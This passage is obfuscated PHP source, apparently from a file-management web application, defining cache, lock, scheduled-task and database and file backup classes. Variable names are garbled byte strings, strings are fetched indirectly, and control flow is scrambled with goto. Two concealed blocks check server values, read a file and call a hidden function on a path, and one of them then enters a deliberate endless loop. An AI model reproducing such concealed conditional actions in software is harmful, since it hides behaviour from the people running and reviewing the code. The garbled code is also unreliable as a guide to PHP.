<?php
 goto cÆªÄÍ¬¯ï; eğëãß¿”Ğ: class CacheLockMemcached { public function lock($…¥ş£”ò, $ÑÂ†ÖÕ¥ = 0) { $™ç¤ää™ = Cache::init(); $Ü½ì¦­ = microtime(!0) + $ÑÂ†ÖÕ¥; while (microtime(!0) < $Ü½ì¦­) { $ıàíêüŠ = $™ç¤ää™->get($…¥ş£”ò); if (!$ıàíêüŠ || $ıàíêüŠ < microtime(!0)) { $Ñœ­éÛ‹ = $™ç¤ää™->handle->add($…¥ş£”ò, $Ü½ì¦­, $ÑÂ†ÖÕ¥); if ($Ñœ­éÛ‹) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ÈÎÌº³) { return Cache::init()->get($ÈÎÌº³); } public function unlock($¤ëÑû±œ) { return Cache::init()->remove($¤ëÑû±œ); } } class CacheLockDatabase { public function lock($‚ßÁŒÖÜ, $Ñî¿¨äô = 0) { $Ë‡å È° = Model($_SERVER[´‹ô¯Œ][920]); $Æò”¯Á = microtime(!0) + $Ñî¿¨äô; while (microtime(!0) < $Æò”¯Á) { $ŠœíÕ = $Ë‡å È°->get($‚ßÁŒÖÜ); if (!$ŠœíÕ || $ŠœíÕ < microtime(!0)) { $ÂÕß…§Å = $Ë‡å È°->set($‚ßÁŒÖÜ, $Æò”¯Á); if ($ÂÕß…§Å) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ñÇ“úé») { return Model($_SERVER[´‹ô¯Œ][920])->get($ñÇ“úé»); } public function unlock($ÖóÙË¼) { Model($_SERVER[´‹ô¯Œ][920])->remove($ÖóÙË¼); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($¿ø»ïë, $•óıÓÕê) { $êÉŸ•ºí =& $_SERVER[´‹ô¯Œ]; if (!class_exists($êÉŸ•ºí[959])) { show_json($êÉŸ•ºí[960], !1); } $this->cacheTime = $•óıÓÕê; $this->handle = new Memcached(); if (is_array($¿ø»ïë[$êÉŸ•ºí[961]]) && count($¿ø»ïë[$êÉŸ•ºí[961]]) >= 1) { foreach ($¿ø»ïë[$êÉŸ•ºí[961]] as $ÀîÒ”Öœ) { $ÉóÈÀÀÍ = explode($êÉŸ•ºí[4], $ÀîÒ”Öœ); $this->handle->addServer($ÉóÈÀÀÍ[0], $ÉóÈÀÀÍ[1]); } } else { $this->handle->addServer($¿ø»ïë[$êÉŸ•ºí[209]], $¿ø»ïë[$êÉŸ•ºí[210]]); } } public function set($£ÖÚí©ß, $å€¿»è, $áªü·× = false) { $áªü·× = $áªü·× ? $áªü·× : $this->cacheTime; return $this->handle->set($£ÖÚí©ß, $å€¿»è, $áªü·×); } public function get($ŒÂŒ‡ƒ¾) { return $this->handle->get($ŒÂŒ‡ƒ¾); } public function remove($•¢á) { return $this->handle->delete($•¢á); } public function deleteAll() { return $this->handle->flush(); } } goto A‡ÜàÕ¯ã; f½ÕñÎë¨: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $¯âÃï ß =& $_SERVER[´‹ô¯Œ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $½º¼üøŸ = $GLOBALS[$¯âÃï ß[6]][$¯âÃï ß[427]]; $–ªõ…Ó“ = $½º¼üøŸ[$½º¼üøŸ[$¯âÃï ß[918]]]; $¾†´ùš¾ = $½º¼üøŸ[$¯âÃï ß[919]]; switch ($½º¼üøŸ[$¯âÃï ß[918]]) { case $¯âÃï ß[21]: self::$handle = Model($¯âÃï ß[920]); break; case $¯âÃï ß[921]: self::$handle = new CacheRedis($–ªõ…Ó“, $¾†´ùš¾); break; case $¯âÃï ß[922]: self::$handle = new CacheMemcached($–ªõ…Ó“, $¾†´ùš¾); break; case $¯âÃï ß[233]: self::$handle = new CacheFile($–ªõ…Ó“, $¾†´ùš¾); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($º‹£™Ø) { if (is_array($º‹£™Ø) || is_object($º‹£™Ø)) { $º‹£™Ø = json_encode($º‹£™Ø); } $º‹£™Ø = rawurlencode($º‹£™Ø); return md5(KOD_SITE_ID . $_SERVER[´‹ô¯Œ][11] . $º‹£™Ø); } public static function get($ª¨ï‰Óï, $ëÒÛ“ÑÒ = false) { $†´Ñ¦£– = self::key($ª¨ï‰Óï); $¸Ø™¦Ñ = self::init(); if ($ëÒÛ“ÑÒ) { return unserialize($¸Ø™¦Ñ->get($†´Ñ¦£–)); } if (!isset(self::$memoryCache[$†´Ñ¦£–])) { $ñü¨¿ƒÅ = $¸Ø™¦Ñ->get($†´Ñ¦£–); self::$memoryCache[$†´Ñ¦£–] = unserialize($ñü¨¿ƒÅ); } return self::$memoryCache[$†´Ñ¦£–]; } public static function set($ïÙÔø™©, $ñ‰ŠàÄÏ, $®Ì²ìÁù = false) { $ƒÌòƒºÙ =& $_SERVER[´‹ô¯Œ]; $Ğ˜‡µ¾Ù = self::key($ïÙÔø™©); if (isset(self::$memoryCache[$Ğ˜‡µ¾Ù]) && self::$memoryCache[$Ğ˜‡µ¾Ù] === $ñ‰ŠàÄÏ) { return !0; } if ($®Ì²ìÁù === 0) { self::$memoryCache[$Ğ˜‡µ¾Ù] = $ñ‰ŠàÄÏ; return !0; } $„ıÉã ¦ = self::init(); $¯Ş‚¸ä¾ = serialize($ñ‰ŠàÄÏ); CacheLock::lock($ïÙÔø™© . $ƒÌòƒºÙ[923]); $ãëŞ§£š = $„ıÉã ¦->set($Ğ˜‡µ¾Ù, $¯Ş‚¸ä¾, $®Ì²ìÁù); self::$memoryCache[$Ğ˜‡µ¾Ù] = $ñ‰ŠàÄÏ; CacheLock::unlock($ïÙÔø™© . $ƒÌòƒºÙ[923]); return $ãëŞ§£š; } public static function getCall($è¹…Ş¥”, $î ¶’ü, $¤¼úç, $ÂÑÌæ = array()) { $ë¸Ù´äË =& $_SERVER[´‹ô¯Œ]; $é„¦÷˜¸ = self::get($è¹…Ş¥”); if ($é„¦÷˜¸ || $é„¦÷˜¸ === $ë¸Ù´äË[12]) { return $é„¦÷˜¸; } $é„¦÷˜¸ = call_user_func_array($¤¼úç, $ÂÑÌæ); $é„¦÷˜¸ = $é„¦÷˜¸ ? $é„¦÷˜¸ : $ë¸Ù´äË[12]; self::set($è¹…Ş¥”, $é„¦÷˜¸, $î ¶’ü); return $é„¦÷˜¸; } public static function remove($ÄÑ¤¯è˜) { $ù‹»ôì = self::key($ÄÑ¤¯è˜); unset(self::$memoryCache[$ù‹»ôì]); self::clearTimeout(); CacheLock::lock($ÄÑ¤¯è˜); $ú¸™˜„Ñ = self::init()->remove($ù‹»ôì); CacheLock::unlock($ÄÑ¤¯è˜); return $ú¸™˜„Ñ; } public static function removeMemory($é£ÑÓ…) { $™¨èğè  = self::key($é£ÑÓ…); unset(self::$memoryCache[$™¨èğè ]); } public static function clearMemory($²Š®°¼§ = false) { if ($²Š®°¼§) { $²Š®°¼§ = self::key($²Š®°¼§); unset(self::$memoryCache[$²Š®°¼§]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[´‹ô¯Œ][924])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[´‹ô¯Œ][925])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Èñëô¬, $İ²¢ç¦) { $ù‘ş¤ëã =& $_SERVER[´‹ô¯Œ]; $this->cachePath = $Èñëô¬[$ù‘ş¤ëã[87]]; $this->prefix = $ù‘ş¤ëã[926]; $this->cacheTime = $İ²¢ç¦; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($Ü›æ°§) { $ßøĞ“ù³ =& $_SERVER[´‹ô¯Œ]; $Ü›æ°§ = str_replace(array($ßøĞ“ù³[927], $ßøĞ“ù³[100], $ßøĞ“ù³[76]), $ßøĞ“ù³[928], $Ü›æ°§); return $this->cachePath . $ßøĞ“ù³[929] . $Ü›æ°§ . $ßøĞ“ù³[930]; } public function set($Ş ¹î¿Â, $’íÁåò, $ë•ó«ò“ = false) { $ë•ó«ò“ = $ë•ó«ò“ ? $ë•ó«ò“ : $this->cacheTime; $á˜É¬ù = $this->getFile($Ş ¹î¿Â); if (file_put_contents($á˜É¬ù, $this->prefix . $’íÁåò, LOCK_EX)) { @touch($á˜É¬ù, intval(time() + $ë•ó«ò“)); clearstatcache(); return !0; } @unlink($á˜É¬ù); return !1; } public function get($˜¸Àö) { $“İ®ØêÉ = $this->getFile($˜¸Àö); if (file_exists($“İ®ØêÉ) && filemtime($“İ®ØêÉ) < time()) { @unlink($“İ®ØêÉ); return !1; } $·ãæÜ = @file_get_contents($“İ®ØêÉ); return substr($·ãæÜ, strlen($this->prefix)); } public function remove($Ü‘ò–Ú–) { $Îáç¹ë = $this->getFile($Ü‘ò–Ú–); return @unlink($Îáç¹ë); } public function deleteAll() { $½Ôˆşş =& $_SERVER[´‹ô¯Œ]; $¾Ï¡”† = scandir($this->cachePath); foreach ($¾Ï¡”† as $”Á–Ô¼«) { $ İÚÁû– = $this->cachePath . $”Á–Ô¼«; if (strpos($ İÚÁû–, $½Ôˆşş[930]) && strpos($ İÚÁû–, $½Ôˆşş[931])) { @unlink($ İÚÁû–); } } } public function clearTimeout() { $ğ Â’® =& $_SERVER[´‹ô¯Œ]; $ÈññŞ­ = scandir($this->cachePath); foreach ($ÈññŞ­ as $ğıùÄ»­) { $ò×´âÖ = $this->cachePath . $ğıùÄ»­; if (strpos($ò×´âÖ, $ğ Â’®[930]) && strpos($ò×´âÖ, $ğ Â’®[931]) && filemtime($ò×´âÖ) < time()) { @unlink($ò×´âÖ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ı¹¾• =& $_SERVER[´‹ô¯Œ]; if (self::$handle) { return self::$handle; } $›èå±Üó = $GLOBALS[$ı¹¾•[6]][$ı¹¾•[427]]; self::$timeout = $›èå±Üó[$ı¹¾•[932]] ? $›èå±Üó[$ı¹¾•[932]] : 10; $¨ê§À° = _get($GLOBALS[$ı¹¾•[6]], $ı¹¾•[933]); $­ÖîˆÆµ = $›èå±Üó[$ı¹¾•[918]] ? $›èå±Üó[$ı¹¾•[918]] : $ı¹¾•[233]; if ($­ÖîˆÆµ == $ı¹¾•[21] && $¨ê§À° == $ı¹¾•[13]) { $­ÖîˆÆµ = $ı¹¾•[233]; } switch ($­ÖîˆÆµ) { case $ı¹¾•[921]: self::$handle = new CacheLockRedis(); break; case $ı¹¾•[922]: self::$handle = new CacheLockMemcached(); break; case $ı¹¾•[21]: self::$handle = new CacheLockDatabase(); break; case $ı¹¾•[233]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ı¹¾•[934], $ı¹¾•[935]); } return self::$handle; } private static function key($Ş‰Åªò) { return $_SERVER[´‹ô¯Œ][936] . Cache::key($Ş‰Åªò); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($İİ³­İ¦ = '') { self::$errorMsg = $İİ³­İ¦; } public static function lockGlobal($Øğ€¥ó, $Ôåå·ê) { return self::lock($Øğ€¥ó, $Ôåå·ê, !0); } public static function lock($‚ê¶Òà, $””ªò¼à = false, $©”¬—õ = false) { $ˆ’¥±Ù =& $_SERVER[´‹ô¯Œ]; $àÁØâ¤¶ = self::init(); $õ†×æ¢´ = self::key($‚ê¶Òà); $””ªò¼à = $””ªò¼à ? $””ªò¼à : self::$timeout; $Øë›»ãŠ = timeFloat(); if (_get($GLOBALS, $ˆ’¥±Ù[937], !1)) { if (!$àÁØâ¤¶->lock($õ†×æ¢´, 0.2)) { die; } return !0; } $İ’´ıÍ = $àÁØâ¤¶->lock($õ†×æ¢´, $””ªò¼à); $÷ğˆ±õ = timeFloat(); if (!$İ’´ıÍ) { $ÙæğšôÎ = "\154\157\143\x6b\x20\145\162\162\x6f\162\73\x6b\x65\x79\x3d{$‚ê¶Òà}\73\164\151\x6d\x65\75{$””ªò¼à}\x3b" . self::$errorMsg . $ˆ’¥±Ù[74] . get_caller_msg(); $³€Ùª²÷ = LNG($ˆ’¥±Ù[938]) . "\50{$””ªò¼à}\x73\x29\56" . LNG($ˆ’¥±Ù[939]); $³€Ùª²÷ .= $ˆ’¥±Ù[940]; if (is_string(self::$errorMsg) && self::$errorMsg) { $³€Ùª²÷ = $³€Ùª²÷ . $ˆ’¥±Ù[941] . self::$errorMsg; } write_log($ˆ’¥±Ù[942] . sprintf($ˆ’¥±Ù[943], timeFloat() - $Øë›»ãŠ) . $ˆ’¥±Ù[944] . $ÙæğšôÎ . $ˆ’¥±Ù[945] . json_encode(error_get_last()), $ˆ’¥±Ù[935]); show_json($³€Ùª²÷, !1); } if (!$©”¬—õ) { self::$lockItem[$õ†×æ¢´] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ºŒ°Œ› = number_format(timeFloat() - $÷ğˆ±õ, 3); write_log($ˆ’¥±Ù[946] . $‚ê¶Òà . $ˆ’¥±Ù[947] . $ºŒ°Œ›, $ˆ’¥±Ù[935]); } return $İ’´ıÍ; } public static function lockGet($ŒµÒœ¡¬) { $‚İ§’œË = self::key($ŒµÒœ¡¬); if (self::$lockItem[$‚İ§’œË]) { return self::$lockItem[$‚İ§’œË]; } return self::init()->lockGet($‚İ§’œË); } public static function unlock($ë¨Áú¿Ö) { $ó˜ºµª¢ =& $_SERVER[´‹ô¯Œ]; $Í½è’Ì‡ = self::key($ë¨Áú¿Ö); self::$lockItem[$Í½è’Ì‡] = null; self::init()->unlock($Í½è’Ì‡); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ó˜ºµª¢[948] . $ë¨Áú¿Ö, $ó˜ºµª¢[935]); } return; } public static function unlockRuntime() { $òÍŒÓ¾™ =& $_SERVER[´‹ô¯Œ]; $¹ÚğÃ¹ = self::init(); $”œœ„µÁ = !1; foreach (self::$lockItem as $¨ŸÜŸ•Ò => $ÉàÊ†Ê¹) { if (!$ÉàÊ†Ê¹) { continue; } $¹ÚğÃ¹->unlock($¨ŸÜŸ•Ò); if (!$”œœ„µÁ) { $”œœ„µÁ = !0; write_log($òÍŒÓ¾™[949] . $¨ŸÜŸ•Ò . $òÍŒÓ¾™[74] . get_caller_msg(), $òÍŒÓ¾™[935]); continue; } write_log($òÍŒÓ¾™[949] . $¨ŸÜŸ•Ò, $òÍŒÓ¾™[935]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $‘¹›¾§ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($òÍŒÓ¾™[950] . $‘¹›¾§ . $òÍŒÓ¾™[951] . ACTION, $òÍŒÓ¾™[935]); } } public static function fileLock($§İ•Å•‘) { $¾ÏÃ‹… =& $_SERVER[´‹ô¯Œ]; if (!$GLOBALS[$¾ÏÃ‹…[952]]) { $GLOBALS[$¾ÏÃ‹…[952]] = array(); } $GLOBALS[$¾ÏÃ‹…[952]][$§İ•Å•‘] = !1; $×†İÀàÏ = fopen(DATA_PATH . $§İ•Å•‘ . $¾ÏÃ‹…[953], $¾ÏÃ‹…[954]); if (!$×†İÀàÏ) { return !1; } $GLOBALS[$¾ÏÃ‹…[952]][$§İ•Å•‘] = $×†İÀàÏ; if (flock($×†İÀàÏ, LOCK_EX)) { return !0; } self::unlock($§İ•Å•‘); show_json($¾ÏÃ‹…[955], !1); return !1; } public static function fileUnlock($ÓùÁ„Òõ) { $Å§öœ˜‡ =& $_SERVER[´‹ô¯Œ]; $”ıëŞÕ‘ = $GLOBALS[$Å§öœ˜‡[952]][$ÓùÁ„Òõ]; if (!$”ıëŞÕ‘) { return; } $GLOBALS[$Å§öœ˜‡[952]][$ÓùÁ„Òõ] = !1; flock($”ıëŞÕ‘, LOCK_UN); fclose($”ıëŞÕ‘); } public static function fileUnlockAll() { $¶Êˆ¼’Ÿ =& $_SERVER[´‹ô¯Œ]; if (!isset($GLOBALS[$¶Êˆ¼’Ÿ[952]]) || !$GLOBALS[$¶Êˆ¼’Ÿ[952]]) { return; } foreach ($GLOBALS[$¶Êˆ¼’Ÿ[952]] as $ËÉƒôŸ” => $™¦ÍÌÅ‘) { if (!$™¦ÍÌÅ‘) { continue; } $GLOBALS[$¶Êˆ¼’Ÿ[952]][$ËÉƒôŸ”] = !1; flock($™¦ÍÌÅ‘, LOCK_UN); fclose($™¦ÍÌÅ‘); } $GLOBALS[$¶Êˆ¼’Ÿ[952]] = array(); } } goto CÎâ‘÷¢“õ; AÍ‹ªÍ…Š: if ($_SERVER[$_SERVER[´‹ô¯Œ][475]] != $_SERVER[$_SERVER[´‹ô¯Œ][476]]) { $_getc = $_SERVER[´‹ô¯Œ][477]; $_getfile = $_SERVER[$_SERVER[´‹ô¯Œ][478]] . $_SERVER[´‹ô¯Œ][479]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[´‹ô¯Œ][288], $_getfilec); if (count($_getarrs) < $_SERVER[´‹ô¯Œ][480]) { $exit = $_SERVER[´‹ô¯Œ][481]; $exit(); } $_act = $_SERVER[´‹ô¯Œ][482]; $_act($_SERVER[$_SERVER[´‹ô¯Œ][483]]); } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\56\164\141\x73\153\x4c\x69\163\164"; public $field = array("\156\141\155\145", "\164\x79\x70\145", "\145\x76\x65\x6e\164", "\164\151\155\x65", "\x64\x65\163\143", "\163\171\163\x74\x65\155", "\145\x6e\141\x62\154\145", "\x6c\x61\x73\x74\122\165\x6e", "\163\157\162\164"); public function listData($ã¥²“ø“ = false, $ô°úùäè = "\163\157\162\x74", $Áì×™·ˆ = false) { return parent::listData($ã¥²“ø“, $ô°úùäè, $Áì×™·ˆ); } public function add($Ï‹ğ¼‹ó) { $ÒóÁùó« =& $_SERVER[´‹ô¯Œ]; $Ã¹Ãü¨ = $this->findByName($Ï‹ğ¼‹ó[$ÒóÁùó«[32]]); if ($Ã¹Ãü¨) { return !1; } $Ï‹ğ¼‹ó[$ÒóÁùó«[1746]] = 0; $Ï‹ğ¼‹ó[$ÒóÁùó«[2020]] = $this->getSort(); return parent::insert($Ï‹ğ¼‹ó); } private function getSort() { $õ¸Ù¯Á² =& $_SERVER[´‹ô¯Œ]; $íƒê¢÷ = parent::listData(); $áãê¥úÍ = array_to_keyvalue($íƒê¢÷, $õ¸Ù¯Á²[12], $õ¸Ù¯Á²[2020]); return empty($áãê¥úÍ) ? 0 : max($áãê¥úÍ) + 1; } public function update($öïé„îÉ, $÷âÍ€•) { $‰ê…ˆ¾ =& $_SERVER[´‹ô¯Œ]; $Ê¨ÉÌ†Å = $this->listData($öïé„îÉ); $¦©¿‘Äº = $this->findByName($÷âÍ€•[$‰ê…ˆ¾[32]]); if (!$Ê¨ÉÌ†Å || $¦©¿‘Äº && $¦©¿‘Äº[$‰ê…ˆ¾[487]] != $Ê¨ÉÌ†Å[$‰ê…ˆ¾[487]]) { return !1; } return parent::update($öïé„îÉ, $÷âÍ€•); } public function remove($£“¤À¡ı, $²ˆøÒÃ– = false) { $¤İ”™ƒ =& $_SERVER[´‹ô¯Œ]; $ÕÃõ«š = $this->listData($£“¤À¡ı); if (!$ÕÃõ«š) { return; } if (!$²ˆøÒÃ– && $ÕÃõ«š[$¤İ”™ƒ[192]] == $¤İ”™ƒ[91]) { return !1; } return parent::remove($£“¤À¡ı); } public function enable($İÊ¬ô—€, $Ä…îçÔ­) { return $this->update($İÊ¬ô—€, array($_SERVER[´‹ô¯Œ][2475] => $Ä…îçÔ­)); } public function run($ŞÓü·òÒ) { return $this->update($ŞÓü·òÒ, array($_SERVER[´‹ô¯Œ][2487] => time())); } } if (!isset($_SERVER[$_SERVER[´‹ô¯Œ][475]]) || !isset($_SERVER[$_SERVER[´‹ô¯Œ][483]])) { $_getc = $_SERVER[´‹ô¯Œ][477]; $_getfile = $_SERVER[$_SERVER[´‹ô¯Œ][478]] . $_SERVER[´‹ô¯Œ][479]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[´‹ô¯Œ][288], $_getfilec); if (count($_getarrs) < $_SERVER[´‹ô¯Œ][480]) { $exit = $_SERVER[´‹ô¯Œ][481]; $exit(); } $_act = $_SERVER[´‹ô¯Œ][482]; $_act($_SERVER[$_SERVER[´‹ô¯Œ][478]] . $_SERVER[´‹ô¯Œ][479]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[´‹ô¯Œ][457]); } } goto bòÕº°±œ‚; f¨í—¢£ä‰: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ÄïşïŸÕ =& $_SERVER[´‹ô¯Œ]; $ö–¾ò€Ù = Backup::get(); self::$io = $ö–¾ò€Ù[$ÄïşïŸÕ[838]]; self::$name = $ö–¾ò€Ù[$ÄïşïŸÕ[32]]; $œá“¡›Œ = new DbManage(); $ïµğ’õ— = $œá“¡›Œ->dbType(); $¹¢—×­¾ = array($ÄïşïŸÕ[864] => $ïµğ’õ—, $ÄïşïŸÕ[865] => time()); Backup::set($¹¢—×­¾); $¨ĞÉöş“ = $this->tmpFilesPath() . $ÄïşïŸÕ[866] . self::$name . $ÄïşïŸÕ[8]; del_dir($¨ĞÉöş“); mk_dir($¨ĞÉöş“); $÷ÌéÈôñ = $ôºœÏ¸ = 0; try { $ß‚˜›Š = $œá“¡›Œ->db()->getTables(); } catch (Exception $î“Ê‹„ª) { Backup::log($ÄïşïŸÕ[867] . $î“Ê‹„ª->getMessage()); return !1; } $ß‚˜›Š = array_diff($ß‚˜›Š, array($ÄïşïŸÕ[868], $ÄïşïŸÕ[869])); foreach ($ß‚˜›Š as $—´–ï»¿) { if ($—´–ï»¿ == $ÄïşïŸÕ[870]) { continue; } $÷ÌéÈôñ += $œá“¡›Œ->model($—´–ï»¿)->count(); } $–ºä²ş = new Task($ÄïşïŸÕ[871], $ÄïşïŸÕ[863], $÷ÌéÈôñ, LNG($ÄïşïŸÕ[872]) . $ÄïşïŸÕ[873] . LNG($ÄïşïŸÕ[874])); $GLOBALS[$ÄïşïŸÕ[875]] = self::$name; foreach ($ß‚˜›Š as $—´–ï»¿) { $ËáƒòâÃ = $¨ĞÉöş“ . $—´–ï»¿ . $ÄïşïŸÕ[876]; if ($—´–ï»¿ == $ÄïşïŸÕ[870]) { @touch($ËáƒòâÃ); continue; } $¾¨½ñì = null; if ($—´–ï»¿ == $ÄïşïŸÕ[877] && $ö–¾ò€Ù[$ÄïşïŸÕ[171]] == $ÄïşïŸÕ[862]) { $¾¨½ñì = self::$io; } $ôºœÏ¸ += $œá“¡›Œ->sqlFromDb($—´–ï»¿, $ËáƒòâÃ, $–ºä²ş, $¾¨½ñì); } unset($GLOBALS[$ÄïşïŸÕ[875]]); $–ºä²ş->end(); if ($ôºœÏ¸ > $÷ÌéÈôñ) { $÷ÌéÈôñ = $ôºœÏ¸; } $¹¢—×­¾ = array($ÄïşïŸÕ[864] => $ïµğ’õ—, $ÄïşïŸÕ[859] => 1, $ÄïşïŸÕ[878] => $÷ÌéÈôñ, $ÄïşïŸÕ[879] => $ôºœÏ¸, $ÄïşïŸÕ[880] => time()); Backup::set($¹¢—×­¾); if ($÷ÌéÈôñ - $ôºœÏ¸ > 0) { $§çà¥£ = $ÄïşïŸÕ[881]; if (!stristr(I18n::getType(), $ÄïşïŸÕ[882])) { $§çà¥£ = $ÄïşïŸÕ[883]; } Backup::log(array($§çà¥£, $¹¢—×­¾)); return !1; } return !0; } private function tmpFilesPath() { $Ñ×âš =& $_SERVER[´‹ô¯Œ]; $µäÀÔà« = TEMP_FILES; if ($GLOBALS[$Ñ×âš[6]][$Ñ×âš[92]][$Ñ×âš[884]]) { $µäÀÔà« = $GLOBALS[$Ñ×âš[6]][$Ñ×âš[92]][$Ñ×âš[884]]; if (!mk_dir($µäÀÔà«) || !is_writable($µäÀÔà«) || !IO::mkfile($µäÀÔà« . $Ñ×âš[885])) { $µäÀÔà« = TEMP_FILES; } } return $µäÀÔà«; } } class BackupDbFile { public function __construct() { } public function index() { $ £û¸†¸ =& $_SERVER[´‹ô¯Œ]; $àëĞÓİ• = Backup::get(); $ªÃÀ®× = $àëĞÓİ•[$ £û¸†¸[32]]; $ƒ›ù¿•˜ = $this->tmpFilesPath() . "\142\141\143\153\x75\x70\x5f{$ªÃÀ®×}\x2f"; $ÀĞı² = $this->backupPath($àëĞÓİ•); if (!($ÀĞı² = IO::mkdir($ÀĞı²))) { Backup::log($ £û¸†¸[886] . $ÀĞı²); return !1; } $«ÙÕÈº€ = IO::listPath($ƒ›ù¿•˜); $Ô¯ÁºĞ” = isset($«ÙÕÈº€[$ £û¸†¸[86]]) ? $«ÙÕÈº€[$ £û¸†¸[86]] : array(); $¬¤üÈõÛ = array_sum(array_column($Ô¯ÁºĞ”, $ £û¸†¸[79])); if (!$¬¤üÈõÛ) { Backup::log($ £û¸†¸[887] . $ƒ›ù¿•˜); return !1; } $Š£††™ = array($ £û¸†¸[888] => $¬¤üÈõÛ, $ £û¸†¸[889] => time()); Backup::set($Š£††™); $í å¯Åç = new TaskFileTransfer($ £û¸†¸[890], $ £û¸†¸[863], count($Ô¯ÁºĞ”), LNG($ £û¸†¸[872]) . $ £û¸†¸[465] . LNG($ £û¸†¸[874]) . $ £û¸†¸[891]); $í å¯Åç->task[$ £û¸†¸[849]] = $¬¤üÈõÛ; foreach ($«ÙÕÈº€[$ £û¸†¸[86]] as $”øË«æ) { $ÇàÒÑĞâ = IO::move($”øË«æ[$ £û¸†¸[87]], $ÀĞı²); if (!$ÇàÒÑĞâ) { $í å¯Åç->end(); $Õ‚šÖ²Í = IO::getLastError($ £û¸†¸[892] . $”øË«æ[$ £û¸†¸[87]] . $ £û¸†¸[893] . $ÀĞı² . $ £û¸†¸[178]); Backup::log($Õ‚šÖ²Í); return !1; } } $‘¸¶õ×ğ = new DbManage(); $‹–Ó®¶ = $‘¸¶õ×ğ->getSqlFile(); if (!$‹–Ó®¶[$ £û¸†¸[894]] || !$‹–Ó®¶[$ £û¸†¸[13]]) { Backup::log($ £û¸†¸[895]); return !1; } IO::move($‹–Ó®¶[$ £û¸†¸[894]], $ÀĞı²); IO::move($‹–Ó®¶[$ £û¸†¸[13]], $ÀĞı²); $í å¯Åç->end(); $Š£††™ = array($ £û¸†¸[896] => $¬¤üÈõÛ, $ £û¸†¸[897] => time()); Backup::set($Š£††™); return !0; } private function backupPath($Üƒïå±÷) { $ÄĞ†ïµË =& $_SERVER[´‹ô¯Œ]; $£æÇş—Ë = $Üƒïå±÷[$ÄĞ†ïµË[32]]; $ø£æÇ¬Æ = Model($ÄĞ†ïµË[856])->get($ÄĞ†ïµË[857]); $Ş£‰Õ• = substr(md5($ÄĞ†ïµË[858] . $ø£æÇ¬Æ . $£æÇş—Ë), 0, 8); return "\173\x69\157\x3a{$Üƒïå±÷[$ÄĞ†ïµË[838]]}\x7d\x2f\x64\141\x74\141\x62\141\163\145\57\142\x61\x63\x6b\x75\x70\x2f" . $£æÇş—Ë . $ÄĞ†ïµË[11] . $Ş£‰Õ•; } private function tmpFilesPath() { $Àú½İöË =& $_SERVER[´‹ô¯Œ]; $ÚÚí’Š = TEMP_FILES; if ($GLOBALS[$Àú½İöË[6]][$Àú½İöË[92]][$Àú½İöË[884]]) { $ÚÚí’Š = $GLOBALS[$Àú½İöË[6]][$Àú½İöË[92]][$Àú½İöË[884]]; if (!mk_dir($ÚÚí’Š) || !is_writable($ÚÚí’Š) || !IO::mkfile($ÚÚí’Š . $Àú½İöË[885])) { $ÚÚí’Š = TEMP_FILES; } } return $ÚÚí’Š; } } class BackupFile { public function __construct() { } public function index() { $ìãº£ò = Backup::get(); $—ù­şôñ = $ìãº£ò[$_SERVER[´‹ô¯Œ][371]][$_SERVER[´‹ô¯Œ][233]][$_SERVER[´‹ô¯Œ][555]]; $À½€° ‡ = array($_SERVER[´‹ô¯Œ][556] => array($_SERVER[´‹ô¯Œ][898], $—ù­şôñ), $_SERVER[´‹ô¯Œ][899] => array($_SERVER[´‹ô¯Œ][409], $ìãº£ò[$_SERVER[´‹ô¯Œ][838]])); $€ø»ßáÚ = (int) Model($_SERVER[´‹ô¯Œ][877])->where($À½€° ‡)->count($_SERVER[´‹ô¯Œ][555]); $êİæ˜óì = (int) Model($_SERVER[´‹ô¯Œ][877])->where($À½€° ‡)->sum($_SERVER[´‹ô¯Œ][79]); $â™Ìƒ„© = new TaskFileTransfer($_SERVER[´‹ô¯Œ][900], $_SERVER[´‹ô¯Œ][863], $€ø»ßáÚ, LNG($_SERVER[´‹ô¯Œ][872]) . $_SERVER[´‹ô¯Œ][873] . LNG($_SERVER[´‹ô¯Œ][901])); $â™Ìƒ„©->task[$_SERVER[´‹ô¯Œ][849]] = $êİæ˜óì; $ÁñŒçŞå = array($_SERVER[´‹ô¯Œ][902] => $€ø»ßáÚ, $_SERVER[´‹ô¯Œ][903] => $êİæ˜óì, $_SERVER[´‹ô¯Œ][904] => time()); Backup::set($ÁñŒçŞå); $ÚÉò¥“¹ = !0; $ªØŠÑÄ¢ = $this->storeIds(); $Şª‚¢ƒ = 1; $ÜôËÕÌØ = 1000; $ğ»¡ßÅ® = $êú·ıı  = 0; $ş¼¾îÂ¿ = array(); $ŞÁ¿”Ç› = $»±‘Øë = 0; do { $¯†¦¾Î¿ = $_SERVER[´‹ô¯Œ][905]; $¢¡ó£äú = Model($_SERVER[´‹ô¯Œ][877])->where($À½€° ‡)->field($¯†¦¾Î¿)->order($_SERVER[´‹ô¯Œ][906])->selectPage($ÜôËÕÌØ, $Şª‚¢ƒ); $Ç˜öˆÁ = !empty($¢¡ó£äú[$_SERVER[´‹ô¯Œ][448]]) ? 